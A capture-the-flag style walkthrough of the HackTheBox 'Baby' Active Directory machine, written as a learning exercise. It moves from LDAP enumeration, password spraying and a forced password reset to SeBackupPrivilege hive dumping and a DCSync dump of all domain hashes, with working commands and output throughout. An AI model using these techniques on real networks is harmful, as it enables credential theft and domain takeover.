---
title: "HTB: Baby"
date: 2026-05-05
draft: false
tags: ["Active Directory", "Windows", "HackTheBox", "LDAP", "DCSync"]
categories: ["Writeups"]
description: "Walkthrough of the Baby Windows Active Directory box: LDAP enumeration, password reset via STATUS_PASSWORD_MUST_CHANGE, SeBackupPrivilege abuse, and a DCSync attack to full Domain Admin."
os: Windows
difficulty: Easy
status: Complete
---

# 🚩 Box Name: Baby

## 📋 Initial Info
- **Hostname:** `baby.vl`

Baby is an easy Windows machine focused on Active Directory fundamentals. The attack path involves LDAP enumeration to identify misconfigured directory data, leading to the discovery of exposed credentials.

After gaining initial access, the compromised user possesses the **`SeBackupPrivilege`**, which can be leveraged to dump the Domain Controller's registry hives and escalate privileges to full Domain Admin.

---

## 🔍 Reconnaissance

### 📡 Port Scanning (Nmap)
> [!TIP] Scan Command
> `sudo nmap -A -T4 -p- -oN nmap/initial <IP>`

```shell
Nmap done: 1 IP address (1 host up) scanned in 4.45 seconds
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-04 15:18 CDT
Nmap scan report for 10.129.32.56
Host is up (0.062s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-04 20:20:43Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Not valid before: 2026-05-03T20:16:26
|_Not valid after:  2026-11-02T20:16:26
| rdp-ntlm-info:
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   DNS_Tree_Name: baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-05-04T20:21:36+00:00
|_ssl-date: 2026-05-04T20:22:16+00:00; +6s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
51562/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
51563/tcp open  msrpc         Microsoft Windows RPC
51572/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-05-04T20:21:37
|_  start_date: N/A
|_clock-skew: mean: 5s, deviation: 0s, median: 5s

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   64.43 ms 10.10.14.1
2   64.38 ms 10.129.32.56

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 198.25 seconds
```

Based on the output this appears to be a Domain Controller. I'll add `baby.vl` and `babydc.baby.vl` to my `/etc/hosts` file.

I enumerated `SMB` without any luck since anonymous access is not allowed.

I next looked at `LDAP` to see if I can enumerate directories without credentials.

Success!

It's a lot of information so I passed it into a text file to search through.

```shell
┌─[split@parrot:~/Documents/HTB/Baby]
└─❯ ldapsearch -H ldap://10.129.32.56 -x -b "dc=baby,dc=vl" > ldapdata                                                                                                        ──(Mon,May04)─┘
┌─[split@parrot:~/Documents/HTB/Baby]
└─❯ ls                                                                                                                                                                        ──(Mon,May04)─┘
ldapdata  nmap
```

With this data and i will search for users, accounts, groups, and passwords using `grep`.

I always start out by looking at the `description:` field as this sometimes has compromising information like passwords.

```shell
┌─[split@parrot:~/Documents/HTB/Baby]
└─❯ cat ldapdata | grep description:                                                                                                                                          ──(Mon,May04)─┘
description: Built-in account for guest access to the computer/domain
description: All workstations and servers joined to the domain
description: Members of this group are permitted to publish certificates to th
description: All domain users
description: All domain guests
description: Members in this group can modify group policy for the domain
description: Servers in this group can access remote access properties of user
description: Members in this group can have their passwords replicated to all
description: Members in this group cannot have their passwords replicated to a
description: Members of this group are Read-Only Domain Controllers in the ent
description: Members of this group that are domain controllers may be cloned.
description: Members of this group are afforded additional protections against
description: DNS Administrators Group
description: DNS clients who are permitted to perform dynamic updates on behal
description: Set initial password to BabyStart123!
```

In this case, a valid password was found: `BabyStart123!`.

A set of usernames was also recovered, which can be compiled into a wordlist for further attacks. This opens the door for techniques like password spraying against additional accounts.

The domain's username format is now clear, allowing for more targeted enumeration. Tools like `Kerbrute` can be used to expand the user list and identify valid accounts.

```shell
┌─[split@parrot:~/Documents/HTB/Baby]
└─❯ cat ldapdata | grep userPrincipalName:                                                                                                                                    ──(Mon,May04)─┘
userPrincipalName: Jacqueline.Barnett@baby.vl
userPrincipalName: Ashley.Webb@baby.vl
userPrincipalName: Hugh.George@baby.vl
userPrincipalName: Leonard.Dyer@baby.vl
userPrincipalName: Connor.Wilkinson@baby.vl
userPrincipalName: Joseph.Hughes@baby.vl
userPrincipalName: Kerry.Wilson@baby.vl
userPrincipalName: Teresa.Bell@baby.vl
```

Plus I found `Caroline.Robinson@baby.vl` near the bottom of the `LDAP` data.

Looking through the `LDAP` data collected it seems these credentials belong to the user `Teresa Bell` who belongs to the `IT` Group.

```shell
# Teresa Bell, it, baby.vl
dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Teresa Bell
sn: Bell
description: Set initial password to BabyStart123!
givenName: Teresa
distinguishedName: CN=Teresa Bell,OU=it,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151108.0Z
whenChanged: 20211121151437.0Z
displayName: Teresa Bell
uSNCreated: 12889
memberOf: CN=it,CN=Users,DC=baby,DC=vl
uSNChanged: 12905
name: Teresa Bell
objectGUID:: EDGXW4JjgEq7+GuyHBu3QQ==
userAccountControl: 66080
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819812778759642
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWWgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Teresa.Bell
sAMAccountType: 805306368
userPrincipalName: Teresa.Bell@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z
msDS-SupportedEncryptionTypes: 0
```

Credentials open up a lot more opportunities for enumeration.

Next I'm going to check to see if these credentials are valid.

The credentials did not work with the user Teresa Bell. I performed a quick password spray with the username list I created earlier but didn't get any hits.

```shell
┌─[split@parrot:~/Documents/HTB/Baby]
└─❯ nxc smb 10.129.32.56 -u 'teresa.bell' -p 'BabyStart123!'                                                                                                                  ──(Mon,May04)─┘
SMB         10.129.32.56    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.32.56    445    BABYDC           [-] baby.vl\teresa.bell:BabyStart123! STATUS_LOGON_FAILURE 
┌─[split@parrot:~/Documents/HTB/Baby]
└─❯ nxc smb 10.129.32.56 -u 'users' -p 'BabyStart123!'                                                                                                                        ──(Mon,May04)─┘
SMB         10.129.32.56    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.32.56    445    BABYDC           [-] baby.vl\Jacqueline.Barnett:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.32.56    445    BABYDC           [-] baby.vl\Ashley.Webb:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.32.56    445    BABYDC           [-] baby.vl\Hugh.George:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.32.56    445    BABYDC           [-] baby.vl\Leonard.Dyer:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.32.56    445    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.32.56    445    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.32.56    445    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.32.56    445    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.32.56    445    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE 
```

```shell
[-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
```

This result stands out. The credentials are valid, but the account requires a password change before it can be used interactively.

After unsuccessfully testing the credentials elsewhere, I revisited the `Caroline.Robinson` account. Research showed that this condition can be leveraged to set a new password without prior authentication in the usual sense.

## ⚡ Exploitation (Initial Access)

There are multiple ways to do this tools like `rpcclient` or `netexec` both support it. I opted for `smbpasswd`, which allowed me to successfully reset the password and gain access.

```shell
┌─[split@parrot:~/Documents/HTB/Baby]
└─❯ smbpasswd -r 10.129.32.56 -U baby.vl/Caroline.Robinson                                                                                                                1 ↵ ──(Mon,May04)─┘
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user Caroline.Robinson
```

Password was changed to `Password123`

```shell
┌─[split@parrot:~/Documents/HTB/Baby]
└─❯ nxc smb baby.vl -u 'Caroline.Robinson' -p 'Password123'                                                                                                                   ──(Mon,May04)─┘
SMB         10.129.32.56    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.32.56    445    BABYDC           [+] baby.vl\Caroline.Robinson:Password123
┌─[split@parrot:~/Documents/HTB/Baby]
└─❯ nxc smb baby.vl -u 'Caroline.Robinson' -p 'Password123' --shares                                                                                                          ──(Mon,May04)─┘
SMB         10.129.32.56    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.32.56    445    BABYDC           [+] baby.vl\Caroline.Robinson:Password123
SMB         10.129.32.56    445    BABYDC           [*] Enumerated shares
SMB         10.129.32.56    445    BABYDC           Share           Permissions     Remark
SMB         10.129.32.56    445    BABYDC           -----           -----------     ------
SMB         10.129.32.56    445    BABYDC           ADMIN$          READ            Remote Admin
SMB         10.129.32.56    445    BABYDC           C$              READ,WRITE      Default share
SMB         10.129.32.56    445    BABYDC           IPC$            READ            Remote IPC
SMB         10.129.32.56    445    BABYDC           NETLOGON        READ            Logon server share
SMB         10.129.32.56    445    BABYDC           SYSVOL          READ            Logon server share
```

I next checked to see if I could use winrm to login to the machine.

```shell
┌─[split@parrot:~/Documents/HTB/Baby]
└─❯ nxc winrm baby.vl -u 'Caroline.Robinson' -p 'Password123'                                                                                                                 ──(Mon,May04)─┘
WINRM       10.129.32.56    5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
WINRM       10.129.32.56    5985   BABYDC           [+] baby.vl\Caroline.Robinson:Password123 (Pwn3d!)
```

Pwn3d!

I am able to use a tool like `Evil-WinRM` to login.

image

## 🛡️ Privilege Escalation

### Local Enumeration 

Once I get a shell one of my first enumeration steps is to check my user's privileges.

Right away without having to dig too much I see a dangerous privilege `SeBackupPrivilege`.

```shell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

`SeBackupPrivilege` is a built-in Windows privilege that allows a user to bypass normal file permissions for the purpose of backing up data. In practice, it means you can read almost any file on the system even ones you normally wouldn't have access to.

From an attacker's perspective, that's extremely useful. It can be abused to copy sensitive files like the **SAM**, **SYSTEM**, or **NTDS.dit** database directly from a Domain Controller. Once dumped, these files can be used to extract password hashes and ultimately escalate privileges, often all the way to Domain Admin.

So I can do this a few ways.

#### Method 1
1. Backup the **SAM** and **SYSTEM** hives
2. Create a script file for `diskshadow`
3. Execute `diskshadow` to create a shadow copy
4. Use `robocopy` to pull files from the shadow copy
5. Transfer the **SAM**, **SYSTEM**, and **SECURITY** hives to the attacker machine
6. Use `impacket-secretsdump` to extract hashes

Backing up the SAM and SYSTEM Hives

```shell
*Evil-WinRM* PS C:\users\public> reg save hklm\sam C:\users\Public\sam
The operation completed successfully.

*Evil-WinRM* PS C:\users\public> reg save hklm\system C:\users\Public\system
The operation completed successfully.

*Evil-WinRM* PS C:\users\public> dir


    Directory: C:\users\public


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---         8/18/2021  11:34 PM                Documents
d-r---          5/8/2021   8:20 AM                Downloads
d-r---          5/8/2021   8:20 AM                Music
d-r---          5/8/2021   8:20 AM                Pictures
d-r---          5/8/2021   8:20 AM                Videos
-a----          5/4/2026  10:51 PM          49152 sam
-a----          5/4/2026  10:51 PM       20676608 system
```

I created this following `diskshadowscript.txt` file:

```shell
set context persistent nowriters
set metadata c:\windows\temp\file.cab
set verbose on
begin backup
add volume c: alias mydrive

create

expose %mydrive% p:
end backup
```

Executed diskshadow

```shell
*Evil-WinRM* PS C:\users\public> dir


    Directory: C:\users\public


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---         8/18/2021  11:34 PM                Documents
d-r---          5/8/2021   8:20 AM                Downloads
d-r---          5/8/2021   8:20 AM                Music
d-r---          5/8/2021   8:20 AM                Pictures
d-r---          5/8/2021   8:20 AM                Videos
-a----          5/4/2026  10:54 PM            167 diskshadowscript.txt
-a----          5/4/2026  10:51 PM          49152 sam
-a----          5/4/2026  10:51 PM       20676608 system


*Evil-WinRM* PS C:\users\public> diskshadow /s C:\Users\Public\diskshadowscript.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  BABYDC,  5/4/2026 10:54:26 PM

-> set context persistent nowriter

SET CONTEXT { CLIENTACCESSIBLE | PERSISTENT [ NOWRITERS ] | VOLATILE [ NOWRITERS ] }

        CLIENTACCESSIBLE        Specify to create shadow copies usable by client versions of Windows.
        PERSISTENT              Specify that shadow copy is persist across program exit, reset or reboot.
        PERSISTENT NOWRITERS    Specify that shadow copy is persistent and all writers are excluded.
        VOLATILE                Specify that shadow copy will be deleted on exit or reset.
        VOLATILE NOWRITERS      Specify that shadow copy is volatile and all writers are excluded.

        Example: SET CONTEXT CLIENTACCESSIBLE
```

At this point, `diskshadow` throws an error notice it truncates `nowriters` to `nowriter`, which breaks execution. I suspected this might be an issue with the Evil-WinRM shell, so I re-tried using a Meterpreter session, but ran into similar problems.

Even though I successfully dumped the **SAM** and **SYSTEM** hives (enough for local hash extraction), I didn't have sufficient privileges to complete this method and access more sensitive files.

The goal here is to retrieve the Domain Controller's `ntds.dit`, which contains domain credential data. Attempts to create a shadow copy using `vssadmin` failed due to insufficient permissions, and other approaches didn't succeed either.

After some research, I found an alternative technique using `diskshadow` to access `ntds.dit`, which I'll cover next.

#### Note
At this point, I already had the **SAM** and **SYSTEM** hives, which is enough to get value out of `secretsdump`. These two work together, SAM stores the local account hashes, while SYSTEM contains the boot key needed to decrypt them. With just those, you can recover local credentials from the machine.

So why bother grabbing the **SECURITY** hive too?

The answer is that SECURITY opens the door to a completely different set of secrets. While SAM focuses on local accounts, the SECURITY hive contains **LSA secrets**, which can include cached domain credentials, service account passwords, scheduled task credentials, and even DPAPI system keys.

In short, you don't need the SECURITY hive to make `secretsdump` work but skipping it means missing out on some of the most valuable credentials available on the system.

I failed to grab the `NTDS` hive with robocopy so I resorted to this second method.

#### Method 2

`https://github.com/improsec/BackupOperatorToolkit`

At first, it looked like I didn't have enough permissions to complete the attack. My attempts to use `diskshadow` and `vssadmin` kept failing, which made it seem like I was stuck. But that wasn't actually the case the issue was the method, not the privileges.

Even though `SeBackupPrivilege` is a powerful permission, it doesn't automatically grant access to everything. Tools like `diskshadow` rely on Volume Shadow Copy (VSS), which requires additional privileges beyond just backup rights. So while I had enough access to read sensitive files, I didn't have the specific permissions needed to create shadow copies.

That's where **BackupOperatorToolkit** came in. Instead of relying on VSS, it directly abuses `SeBackupPrivilege` the way it was intended. Under the hood, it uses Windows backup APIs to open and read protected files while bypassing normal file permissions. This allows access to critical files like the `SAM`, `SYSTEM`, and `SECURITY` hives and on a Domain Controller, even the `ntds.dit` database.

I next compiled the `.sln` file and used the `DUMP` flag.

```shell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> .\BackupOperatorToolkit.exe DUMP C:\\ \\BabyDC
DUMP MODE
[+] Connecting to registry hive
[+] hive: SAM
[+] Dumping hive to C:\\
[+] Connecting to registry hive
[+] hive: SYSTEM
[+] Dumping hive to C:\\
[+] Connecting to registry hive
[+] hive: SECURITY
[+] Dumping hive to C:\\
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> dir c:\


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         8/19/2021   6:24 AM                EFI
d-----         4/16/2025   9:17 AM                inetpub
d-----          5/8/2021   8:20 AM                PerfLogs
d-r---         4/16/2025   8:35 AM                Program Files
d-----         4/16/2025   9:38 AM                Program Files (x86)
d-r---         7/27/2024  10:27 PM                Users
d-----         8/20/2025   9:07 AM                Windows
-a----          5/5/2026   4:46 PM          28672 SAM
-a----          5/5/2026   4:46 PM          32768 SECURITY
-a----          5/5/2026   4:46 PM       20791296 SYSTEM
```

This worked because it aligned perfectly with the privilege I had. Rather than trying to force a snapshot-based approach, it leveraged backup semantics to read files directly.

So while both methods aim to achieve similar goals accessing protected system data they operate very differently. `diskshadow` depends on VSS and higher privileges, whereas BackupOperatorToolkit works purely with `SeBackupPrivilege`.

One thing to keep in mind is that while this method is reliable, it's not particularly stealthy. Accessing files like `SAM` or `ntds.dit` can generate logs and may be flagged in real environments. In a lab or CTF, that's not a concern but in a real engagement, it's something to be aware of.

The main takeaway here is simple: having the right privilege isn't always enough—you also need to use the right technique that matches it.

Next part is straightforward. I used `impacket's secretsdump` to extract local hashes.

```shell
┌─[split@parrot:~/Documents/HTB/Baby]
└─❯ ls                                                                        ──(Tue,May05)─┘
BackupOperatorToolkit.exe  ds.txt    lol.exe  SAM       SYSTEM
Bloodhound_Data            ldapdata  nmap     SECURITY  users
┌─[split@parrot:~/Documents/HTB/Baby]
└─❯ secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL           ──(Tue,May05)─┘
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC:plain_password_hex:0d43eb797b84b0b440fbcb0d89fea14f8458970482b891850f2d2106c7c08447f2aa725adc71c58241311e5cebf5b75d43f5b541a43d583665ea4669bee9d1910c4ee1f4703104fccf44eb3ac2b3bb31ed1712e4fca7e416d3bd561993cd88a9750b0a04466909e51660a3fec061e9f5a51e8e10fe8c2653cd610140611ea9cd2fc1f436829369373bfb51fc5214666a9073e7a8124f4a07414ee0a7e565f24745f2ec5f134e7b7dca577813e5e82867ea33b16a1797c51703731eb1e4273db597063d62cb7f1c1a0faae15ab06aadea286b87cf6f2d28127fb948113c6b57c92a97c1aad038f958404b27f6e6d6fba5
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:3d538eabff6633b62dbaa5fb5ade3b4d
[*] DPAPI_SYSTEM
dpapi_machinekey:0xe620195f1a5e2d71842bbad9877d7c3ca8a31eda
dpapi_userkey:0x026920834cd39c2e8ba9401c44a8869fe6be0555
[*] NL$KM
 0000   B6 96 C7 7E 17 8A 0C DD  8C 39 C2 0A A2 91 24 44   ...~.....9....$D
 0010   A2 E4 4D C2 09 59 46 C0  7F 95 EA 11 CB 7F CB 72   ..M..YF........r
 0020   EC 2E 5A 06 01 1B 26 FE  6D A7 88 0F A5 E7 1F A5   ..Z...&.m.......
 0030   96 CD E5 3F A0 06 5E C1  A5 01 A1 CE 8C 24 76 95   ...?..^......$v.
NL$KM:b696c77e178a0cdd8c39c20aa2912444a2e44dc2095946c07f95ea11cb7fcb72ec2e5a06011b26fe6da7880fa5e71fa596cde53fa0065ec1a501a1ce8c247695
[*] Cleaning up...
```

I next used the machine account to perform a DCSync attack.

To run DCSync, you need:

- `Replicating Directory Changes`
- `Replicating Directory Changes All`

Normally held by:

- Domain Controllers
- Domain Admins

If the machine is a Domain Controller it's account has replication rights. This is why `--ntds` works.

```shell
┌─[split@parrot:~/Documents/HTB/Baby]
└─❯ nxc smb baby.vl -u BabyDC\$ -H 3d538eabff6633b62dbaa5fb5ade3b4d --ntds    ──(Tue,May05)─┘
SMB         10.129.32.56    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.32.56    445    BABYDC           [+] baby.vl\BabyDC$:3d538eabff6633b62dbaa5fb5ade3b4d
SMB         10.129.32.56    445    BABYDC           [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
SMB         10.129.32.56    445    BABYDC           [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.129.32.56    445    BABYDC           Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
SMB         10.129.32.56    445    BABYDC           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.32.56    445    BABYDC           krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::
SMB         10.129.32.56    445    BABYDC           baby.vl\Jacqueline.Barnett:1104:aad3b435b51404eeaad3b435b51404ee:20b8853f7aa61297bfbc5ed2ab34aed8:::
SMB         10.129.32.56    445    BABYDC           baby.vl\Ashley.Webb:1105:aad3b435b51404eeaad3b435b51404ee:02e8841e1a2c6c0fa1f0becac4161f89:::
SMB         10.129.32.56    445    BABYDC           baby.vl\Hugh.George:1106:aad3b435b51404eeaad3b435b51404ee:f0082574cc663783afdbc8f35b6da3a1:::
SMB         10.129.32.56    445    BABYDC           baby.vl\Leonard.Dyer:1107:aad3b435b51404eeaad3b435b51404ee:b3b2f9c6640566d13bf25ac448f560d2:::
SMB         10.129.32.56    445    BABYDC           baby.vl\Ian.Walker:1108:aad3b435b51404eeaad3b435b51404ee:0e440fd30bebc2c524eaaed6b17bcd5c:::
SMB         10.129.32.56    445    BABYDC           baby.vl\Connor.Wilkinson:1110:aad3b435b51404eeaad3b435b51404ee:e125345993f6258861fb184f1a8522c9:::
SMB         10.129.32.56    445    BABYDC           baby.vl\Joseph.Hughes:1112:aad3b435b51404eeaad3b435b51404ee:31f12d52063773769e2ea5723e78f17f:::
SMB         10.129.32.56    445    BABYDC           baby.vl\Kerry.Wilson:1113:aad3b435b51404eeaad3b435b51404ee:181154d0dbea8cc061731803e601d1e4:::
SMB         10.129.32.56    445    BABYDC           baby.vl\Teresa.Bell:1114:aad3b435b51404eeaad3b435b51404ee:7735283d187b758f45c0565e22dc20d8:::
SMB         10.129.32.56    445    BABYDC           baby.vl\Caroline.Robinson:1115:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
SMB         10.129.32.56    445    BABYDC           BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:3d538eabff6633b62dbaa5fb5ade3b4d:::
SMB         10.129.32.56    445    BABYDC           [+] Dumped 14 NTDS hashes to /home/split/.nxc/logs/ntds/BABYDC_10.129.32.56_2026-05-05_123646.ntds of which 13 were added to the database
SMB         10.129.32.56    445    BABYDC           [*] To extract only enabled accounts from the output file, run the following command:
SMB         10.129.32.56    445    BABYDC           [*] grep -iv disabled /home/split/.nxc/logs/ntds/BABYDC_10.129.32.56_2026-05-05_123646.ntds | cut -d ':' -f1
```

## 📓 Lessons Learned

I had two different approaches for pulling sensitive data from the Domain Controller, and it raised an important question. Could I have retrieved everything I needed from the first method?

The short answer is yes, at least partially. Using `reg save`, I was already able to dump the **SAM** and **SYSTEM** hives thanks to `SeBackupPrivilege`. If my `diskshadow` attempt had worked, I could have just as easily copied the **SECURITY** hive from the shadow copy as well. The issue wasn't capability—it was that Volume Shadow Copy (VSS) wasn't cooperating in my shell, which blocked that path entirely.

Originally, the goal of that method wasn't just to grab registry hives it was to go after the real prize: the `ntds.dit` file. This file contains the full Active Directory database, including all domain user hashes. The plan was to create a shadow copy and then use something like `robocopy` to pull `ntds.dit` offline for parsing. Since the VSS step failed, that approach never fully materialized.

Using `BackupOperatorToolkit` in the second method improved things. It let me successfully dump **SAM**, **SYSTEM**, and **SECURITY** by properly abusing `SeBackupPrivilege`. That gave me local hashes and LSA secrets, which is useful but still not the complete domain picture.

Instead of continuing to fight with offline extraction, I pivoted to a much cleaner approach: **DCSync**.

```shell
nxc smb baby.vl -u BabyDC\$ -H 3d538eabff6633b62dbaa5fb5ade3b4d --ntds
```

This worked because I was using the machine account of the Domain Controller itself. DC machine accounts have built-in replication privileges, which means they're allowed to request password data from Active Directory. With DCSync, I didn't need to touch `ntds.dit` at all instead, I simply asked the Domain Controller to replicate its secrets to me.

That's the key difference. Rather than stealing and parsing the database offline, DCSync interacts with Active Directory the way another DC would. It's faster, more reliable, and avoids the complications of shadow copies and file locking.

In the end, while both methods can lead to the same goal, DCSync is the more direct path once you have the right level of access.
